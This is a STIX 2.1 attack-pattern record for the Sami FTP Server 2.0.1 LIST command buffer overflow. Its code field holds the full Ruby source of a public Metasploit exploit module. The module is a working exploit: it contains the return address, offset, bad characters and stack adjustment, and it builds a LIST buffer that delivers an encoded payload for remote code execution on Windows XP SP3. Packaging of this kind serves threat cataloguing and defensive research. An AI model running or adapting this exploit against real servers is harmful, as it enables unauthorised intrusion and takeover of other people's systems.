{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--32704e3a-4aa2-4327-bafa-dd4222c79f40",
    "created": "2024-08-14T16:51:13.827763Z",
    "modified": "2024-08-14T16:51:13.827767Z",
    "name": "Sami FTP Server LIST Command Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow on Sami FTP Server 2.0.1. The vulnerability exists in the processing of LIST commands. In order to trigger the vulnerability, the \"Log\" tab must be viewed in the Sami FTP Server managing application, in the target machine. On the other hand, the source IP address used to connect with the FTP Server is needed. If the user can't provide it, the module will try to resolve it. This module has been tested successfully on Sami FTP Server 2.0.1 over Windows XP SP3.  'Platform'\t\t => 'win'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/sami_ftpd_list.rb",
            "external_id": "sami_ftpd_list.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = LowRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t\t => 'Sami FTP Server LIST Command Buffer Overflow',\n      'Description'\t => %q{\n          This module exploits a stack based buffer overflow on Sami FTP Server 2.0.1.\n        The vulnerability exists in the processing of LIST commands. In order to trigger\n        the vulnerability, the \"Log\" tab must be viewed in the Sami FTP Server managing\n        application, in the target machine. On the other hand, the source IP address used\n        to connect with the FTP Server is needed. If the user can't provide it, the module\n        will try to resolve it. This module has been tested successfully on Sami FTP Server\n        2.0.1 over Windows XP SP3.\n      },\n      'Platform'\t\t => 'win',\n      'Author'\t\t =>\n        [\n          'superkojiman', # Original exploit\n          'Doug Prostko <dougtko[at]gmail.com>' # MSF module\n        ],\n      'License'\t\t => MSF_LICENSE,\n      'References'\t =>\n        [\n          [ 'OSVDB', '90815'],\n          [ 'BID', '58247'],\n          [ 'EDB', '24557']\n        ],\n      'Privileged'\t => false,\n      'Payload'\t\t =>\n        {\n          'Space'          => 1500,\n          'DisableNops'    => true,\n          'BadChars'       => \"\\x00\\x0a\\x0d\\x20\\x5c\",\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'Targets'\t\t =>\n        [\n          [ 'Sami FTP Server 2.0.1 / Windows XP SP3',\n            {\n              'Ret' => 0x10028283, # jmp esp from C:\\Program Files\\PMSystem\\Temp\\tmp0.dll\n              'Offset'   => 228\n            }\n          ],\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2013-02-27'))\n    register_options(\n      [\n        OptAddress.new('SOURCEIP', [false, 'The local client address'])\n      ])\n  end\n\n  def exploit\n    connect\n    if datastore['SOURCEIP']\n      ip_length = datastore['SOURCEIP'].length\n    else\n      ip_length = Rex::Socket.source_address(rhost).length\n    end\n    buf = rand_text(target['Offset'] - ip_length)\n    buf << [ target['Ret'] ].pack('V')\n    buf << rand_text(16)\n    buf << payload.encoded\n    send_cmd( ['LIST', buf], false )\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-27"
}